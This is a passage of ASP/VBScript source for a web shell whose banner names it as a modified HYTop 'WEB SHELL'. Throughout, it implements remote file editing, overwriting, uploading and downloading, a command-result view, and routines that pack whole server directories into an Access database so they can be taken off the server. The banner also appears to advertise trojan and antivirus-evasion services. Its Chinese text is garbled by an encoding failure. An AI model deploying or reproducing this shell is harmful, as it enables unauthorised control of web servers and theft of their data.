RRS "newWin=window.open('?pageName=' + pageName.value + '&theAct=' + act + '&thePath=' + usePath.value, '_self', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
RRS "}" & vbNewLine
RRS "function downTheFile(){" & vbNewLine
RRS "if(confirm('������ļ�����20M,\n���鲻Ҫͨ������ʽ����\n������ռ�÷�������������Դ\n�����ܵ��·���������!\n�������Ȱ��ļ����Ƶ���ǰվ��Ŀ¼��,\nȻ��ͨ��httpЭ��������.\n��\""ȷ��\""��������������.')){" & vbNewLine
RRS "newWin=window.open('?pageName=' + pageName.value + '&theAct=downTheFile&thePath=' + usePath.value, '_self', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
RRS "}" & vbNewLine
RRS "}" & vbNewLine
RRS "function appDoAction2(act){" & vbNewLine
RRS "newWin=window.open('?pageName=' + pageName.value + '&theAct=' + act + '&thePath=' + truePath.value, '_self','menu=no,resizable=yes,height=100,width=368');" & vbNewLine
RRS "}" & vbNewLine
RRS "function appTheAttributes(){" & vbNewLine
RRS "newWin=window.open('?pageName=' + pageName.value + '&theAct=theAttributes&thePath=' + usePath.value, '_self', 'menu=no,resizable=yes,height=194,width=368');" & vbNewLine
RRS "}" & vbNewLine
RRS "function appRename(){" & vbNewLine
RRS "newWin=window.open('?pageName=' + pageName.value + '&theAct=rename&thePath=' + usePath.value, '_self', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
RRS "}" & vbNewLine
RRS "function upTheFile(){" & vbNewLine
RRS "newWin=window.open('?pageName=' + pageName.value + '&theAct=showUpload&thePath=' + truePath.value, '_self', 'menu=no,resizable=yes,height=80,width=380');" & vbNewLine
RRS "}" & vbNewLine
RRS "function wsLoadIFrame(){" & vbNewLine
RRS "cmdResult.location.href='?pageName=SaCmdRun&theAct=readResult';" & vbNewLine
RRS "}" & vbNewLine
RRS "function fsoRename(){" & vbNewLine
RRS "newWin=window.open('?pageName=' + pageName.value + '&theAct=showFsoRename&thePath=' + usePath.value, '_self', 'menu=no,resizable=yes,height=20,width=300');" & vbNewLine
RRS "}" & vbNewLine
RRS "function delOne(){" & vbNewLine
RRS "newWin=window.open('?pageName=' + pageName.value + '&theAct=delOne&thePath=' + usePath.value, '_self', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
RRS "}" & vbNewLine
RRS "function fsoGetAttributes(){" & vbNewLine
RRS "newWin=window.open('?pageName=' + pageName.value + '&theAct=getAttributes&thePath=' + usePath.value, '_self', 'menu=no,resizable=yes,height=170,width=300');" & vbNewLine
RRS "}" & vbNewLine
RRS "</script>"
End Sub

Sub openUrl(usePath)
Dim theUrl, thePath

thePath=Server.MapPath("/")

If LCase(Left(usePath, Len(thePath)))=LCase(thePath) Then
theUrl=Mid(usePath, Len(thePath) + 1)
theUrl=Replace(theUrl, "\", "/")
If Left(theUrl, 1)="/" Then
theUrl=Mid(theUrl, 2)
End If
Response.Redirect("/" & theUrl)
 Else
alertThenClose("����Ҫ�򿪵��ļ����ڱ���\n�����Գ��԰�Ҫ��(����)���ļ�ճ����\nվ��Ŀ¼��,Ȼ���ٴ�(����)!")
Response.End
End If
End Sub

Sub showEdit(thePath, strMethod)
If isDebugMode=False Then
On Error Resume Next
End If
Dim theFile, unEditableExt

If Right(thePath, 1)="\" Then
alertThenClose("�༭�ļ��в����ǷǷ���.")
Response.End
End If

unEditableExt="$exe$dll$bmp$wav$mp3$wma$ra$wmv$ram$rm$avi$mgp$png$tiff$gif$pcx$jpg$com$msi$scr$rar$zip$ocx$sys$mdb$"

RRS "<style>body{border:none;overflow:hidden;background-color:buttonface;}</style>"
RRS "<body topmargin=9>"
RRS "<form method=post style='margin:0;width:100%;height:100%;'>"
RRS "<textarea name=fileContent style='width:100%;height:90%;'>"
If strMethod="stream" Then
RRS HtmlEncode(streamLoadFromFile(thePath))
 Else
Set theFile=fsoX.OpenTextFile(thePath, 1)
RRS HtmlEncode(theFile.ReadAll())
theFile.Close
Set theFile=Nothing
End If
RRS "</textarea><hr/>"
RRS "<div align=right>"
RRS "����Ϊ:<input size=30 name=thePath value=""" & HtmlEncode(thePath) & """> "
RRS "<input type=checkbox name='windowStatus' id=windowStatus"
If Request.Cookies(m & "windowStatus")="True" Then
RRS " checked"
End If
RRS "><label for=windowStatus>����󷵼�Ŀ¼</label> "
RRS "<input type=submit value=' ���� '><input type=hidden value='saveFile' name=theAct>"
RRS "<input type='button' name='Submit2' value=' ˢ�� ' onClick='javascript:location.reload();'>"
RRS "<input type=reset value=' �ָ� '>"
RRS "<input type=button value=' ��� ' onclick=this.form.fileContent.innerText='';>"
RRS strJsCloseMe & "</div>"
RRS "</form>"
RRS "</body><br/>"
End Sub

Sub saveToFile(thePath, strMethod)
If isDebugMode=False Then
On Error Resume Next
End If
Dim fileContent, windowStatus
fileContent=Request("fileContent")
windowStatus=Request("windowStatus")

If strMethod="stream" Then
streamSaveToFile thePath, fileContent
chkErr(Err)
 Else
fsoSaveToFile thePath, fileContent
chkErr(Err)
End If

If windowStatus="on" Then
Response.Cookies(m & "windowStatus")="False"
RRS "<script>alert('����ɹ���\n����Ŀ¼״̬��');history.go(-2);</script>"
 Else
Response.Cookies(m & "windowStatus")="True"
RRS "<script>alert('����ɹ�����\n\n���ر༭״̬��');window.close();</script>"
Call showEdit(thePath, strMethod)
End If
End Sub

Sub fsoSaveToFile(thePath, fileContent)
Dim theFile
Set theFile=fsoX.OpenTextFile(thePath, 2, True)
theFile.Write fileContent
theFile.Close
Set theFile=Nothing
End Sub

Function streamLoadFromFile(thePath)
Dim stream
If isDebugMode=False Then
On Error Resume Next
End If
Set stream=Server.CreateObject("adodb.stream")
With stream
.Type=2
.Mode=3
.Open
.LoadFromFile thePath
.LoadFromFile thePath
If Request("pageName") <> "TxtSearcher" Then
chkErr(Err)
End If
.Charset="gb2312"
.Position=2
streamLoadFromFile=.ReadText()
.Close
End With
Set stream=Nothing
End Function

Sub downTheFile(thePath)
Response.Clear
If isDebugMode=False Then
On Error Resume Next
End If
Dim stream, fileName, fileContentType

fileName=split(thePath,"\")(uBound(split(thePath,"\")))
Set stream=Server.CreateObject("adodb.stream")
stream.Open
stream.Type=1
stream.LoadFromFile(thePath)
chkErr(Err)
Response.AddHeader "Content-Disposition", "attachment; filename=" & fileName
Response.AddHeader "Content-Length", stream.Size
Response.Charset="UTF-8"
Response.ContentType="application/octet-stream"
Response.BinaryWrite stream.Read 
Response.Flush
stream.Close
Set stream=Nothing
End Sub

Sub showUpload(thePath, pageName)
RRS "<style>body{margin:0;overflow:hidden;}</style>"
RRS "<form method=post enctype='multipart/form-data' action='?pageName=" & pageName & "&theAct=upload&thePath=" & UrlEncode(thePath) & "' onsubmit='this.Submit.disabled=true;;'>"
RRS "�ϴ��ļ�: <input name=file type=file size=31><br/>����Ϊ: "
RRS "<input name=fileName type=text value=""" & HtmlEncode(thePath) & """ size=33>"
RRS "<input type=checkbox name=writeMode value=True>����ģʽ<hr/>"
RRS "<input name=Submit type=submit id=Submit value='�� ��' onClick=""this.form.action+='&fileName='+this.form.fileName.value+'&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;"">"
RRS  strJsCloseMe
RRS "</form>"
End Sub

Sub streamUpload(thePath)
If isDebugMode=False Then
On Error Resume Next
End If
Server.ScriptTimeOut=5000
Dim i, j, info, stream, streamT, theFile, fileName, overWrite, fileContent
theFile=Request("theFile")
fileName=Request("fileName")
overWrite=Request("overWrite")

If InStr(fileName, ":") <= 0 Then
fileName=thePath & fileName
End If

Set stream=Server.CreateObject("adodb.stream")
Set streamT=Server.CreateObject("adodb.stream")

With stream
.Type=1
.Mode=3
.Open
.Write Request.BinaryRead(Request.TotalBytes)
.Position=0
fileContent=.Read()
i=InStrB(fileContent, chrB(13) & chrB(10))
info=LeftB(fileContent, i - 1)
i=Len(info) + 2
i=InStrB(i, fileContent, chrB(13) & chrB(10) & chrB(13) & chrB(10)) + 4 - 1
j=InStrB(i, fileContent, info) - 1
streamT.Type=1
streamT.Mode=3
streamT.Open
stream.position=i
.CopyTo streamT, j - i - 2
If overWrite="true" Then
streamT.SaveToFile fileName, 2
Else
streamT.SaveToFile fileName
End If
If Err.Number=3004 Then
Err.Clear
fileName=fileName & "\" & Split(theFile, "\")(UBound(Split(theFile ,"\")))
If overWrite="true" Then
streamT.SaveToFile fileName, 2
 Else
streamT.SaveToFile fileName
End If
End If
chkErr(Err)
RRS("<script language=""javascript"">alert('�ļ��ϴ��ɹ�!\n" & Replace(fileName, "\", "\\") & "');</script>")
streamT.Close
.Close
End With

Set stream=Nothing
Set streamT=Nothing
End Sub

Function getDriveType(num)
Select Case num
Case 0
getDriveType="δ֪"
Case 1
getDriveType="���ƶ�����"
Case 2
getDriveType="����Ӳ��"
Case 3
getDriveType="�������"
Case 4
getDriveType="CD-ROM"
Case 5
getDriveType="RAM ����"
End Select
End Function

Function getFileIcon(extName)
Select Case LCase(extName)
Case "vbs", "h", "c", "cfg", "pas", "bas", "log", "asp", "txt", "php", "ini", "inc", "htm", "html", "xml", "conf", "config", "jsp", "java", "htt", "lst", "aspx", "php3", "php4", "js", "css", "asa"
getFileIcon="Wingdings>2"
Case "wav", "mp3", "wma", "ra", "wmv", "ram", "rm", "avi", "mpg"
getFileIcon="Webdings>��"
Case "jpg", "bmp", "png", "tiff", "gif", "pcx", "tif"
getFileIcon="'webdings'>&#159;"
Case "exe", "com", "bat", "cmd", "scr", "msi"
getFileIcon="Webdings>1"
Case "sys", "dll", "ocx"
getFileIcon="Wingdings>&#255;"
Case Else
getFileIcon="'Wingdings 2'>/"
End Select
End Function

Function getStartType(num)
Select Case num
Case 2
getStartType="�Զ�"
Case 3
getStartType="�ֶ�"
Case 4
getStartType="�ѽ���"
End Select
End Function

Sub PageAddToMdb()
Dim theAct, thePath
theAct=Request("theAct")
thePath=Request("thePath")
Server.ScriptTimeOut=5000

showTitle("�ļ��д��/�⿪��")

If theAct="addToMdb" Then
addToMdb(thePath)
alertThenClose("�������!")
Response.End
End If
If theAct="releaseFromMdb" Then
unPack(thePath)
alertThenClose("�������!")
Response.End
End If

RRS "�ļ��д��:<br/>"
RRS "<form method=post target=main>"
RRS "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
RRS "<input type=hidden value=addToMdb name=theAct>"
RRS "<select name=theMethod><option value=fso>FSO</option><option value=app>��FSO</option>"
RRS "</select>"
RRS "<br><input type=submit value='��ʼ���'>"
RRS "<hr/>ע: �������HYTop.mdb�ļ�,λ��ľ��MMͬ��Ŀ¼��"
RRS "</form>"

RRS "<hr/>�ļ����⿪(��FSO֧��):<br/>"
RRS "<form method=post target=main>"
RRS "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\HYTop.mdb"" size=80>"
RRS "<input type=hidden value=releaseFromMdb name=theAct><input type=submit value='���ҽ⿪'>"
RRS "<hr/>ע: �⿪���������ļ���λ��ľ��MMͬ��Ŀ¼��"
RRS "</form>"
RRS "<hr/>"
End Sub

Sub addToMdb(thePath)
If isDebugMode=False Then
On Error Resume Next
End If
Dim rs, conn, stream, connStr, adoCatalog
Set rs=Server.CreateObject("ADODB.RecordSet")
Set stream=Server.CreateObject("ADODB.Stream")
Set conn=Server.CreateObject("ADODB.Connection")
Set adoCatalog=Server.CreateObject("ADOX.Catalog")
connStr="Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("HYTop.mdb")

adoCatalog.Create connStr
conn.Open connStr
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")

stream.Open
stream.Type=1
rs.Open "FileData", conn, 3, 3

If Request("theMethod")="fso" Then
fsoTreeForMdb thePath, rs, stream
 Else
saTreeForMdb thePath, rs, stream
End If

rs.Close
Conn.Close
stream.Close
Set rs=Nothing
Set conn=Nothing
Set stream=Nothing
Set adoCatalog=Nothing
End Sub

Function fsoTreeForMdb(thePath, rs, stream)
Dim item, theFolder, folders, files, sysFileList
sysFileList="$HYTop.mdb$HYTop.ldb$"
If fsoX.FolderExists(thePath)=False Then
showErr(thePath & " Ŀ¼�����ڻ��߲��������!")
End If
Set theFolder=fsoX.GetFolder(thePath)
Set files=theFolder.Files
Set folders=theFolder.SubFolders

For Each item In folders
fsoTreeForMdb item.Path, rs, stream
Next

For Each item In files
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath")=Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent")=stream.Read()
rs.Update
End If
Next

Set files=Nothing
Set folders=Nothing
Set theFolder=Nothing
End Function

Sub unPack(thePath)
If isDebugMode=False Then
On Error Resume Next
End If
Server.ScriptTimeOut=5000
Dim rs, ws, str, conn, stream, connStr, theFolder
str=Server.MapPath(".") & "\"
Set rs=CreateObject("ADODB.RecordSet")
Set stream=CreateObject("ADODB.Stream")
Set conn=CreateObject("ADODB.Connection")
connStr="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"

conn.Open connStr
rs.Open "FileData", conn, 1, 1
stream.Open
stream.Type=1

Do Until rs.Eof
theFolder=Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
If fsoX.FolderExists(str & theFolder)=False Then
createFolder(str & theFolder)
End If
stream.SetEos()
stream.Write rs("fileContent")
stream.SaveToFile str & rs("thePath"), 2
rs.MoveNext
Loop

rs.Close
conn.Close
stream.Close
Set ws=Nothing
Set rs=Nothing
Set stream=Nothing
Set conn=Nothing
End Sub

Sub createFolder(thePath)
Dim i
i=Instr(thePath, "\")
Do While i > 0
If fsoX.FolderExists(Left(thePath, i))=False Then
fsoX.CreateFolder(Left(thePath, i - 1))
End If
If InStr(Mid(thePath, i + 1), "\") Then
i=i + Instr(Mid(thePath, i + 1), "\")
Else
i=0
End If
Loop
End Sub

Sub saTreeForMdb(thePath, rs, stream)
Dim item, theFolder, sysFileList
sysFileList="$HYTop.mdb$HYTop.ldb$"
Set theFolder=saX.NameSpace(thePath)

For Each item In theFolder.Items
If item.IsFolder=True Then
saTreeForMdb item.Path, rs, stream
Else
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath")=Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent")=stream.Read()
rs.Update
End If
End If
Next

Set theFolder=Nothing
End Sub

sub ShiSanMain()
RRS "<html><head><style>body{font-size: 12px;color: #CCCCCC;background-color: #444;}</style></head><body><div style='padding:100px;width:100%;height:100%;background-color: #555;line-height:20px;'><div align=center style='font-size:14px;color:#ff0000'><b>"&myName&"</b></div><br />&nbsp;&nbsp;&nbsp;&nbsp;��WEB SHELL�Ǹ���H Y MM�޸���ɣ���������˼�������Ĺ��ܡ�<br />&nbsp;&nbsp;&nbsp;&nbsp;"&myName&"��ʾ����<br />�ð汾Ϊ��ѳ��򣬽�ֹ�޸ļ���ҵ���ۣ��벻Ҫ�øó��������������飬�������Ը���<ol><li>��ҳ�� <b>"&myName&"</b> �༭�޸�</li><li>"&myname&"��<a href="&SiteURL&" target=newwindow><font color=red>"&SiteURL&"</font></a></li><li><font color=red>ע�����˹���,������,��ɱ,ľ������ҵ��QQ:917840993</font></li></ol></div></body></html>"
end sub
%>
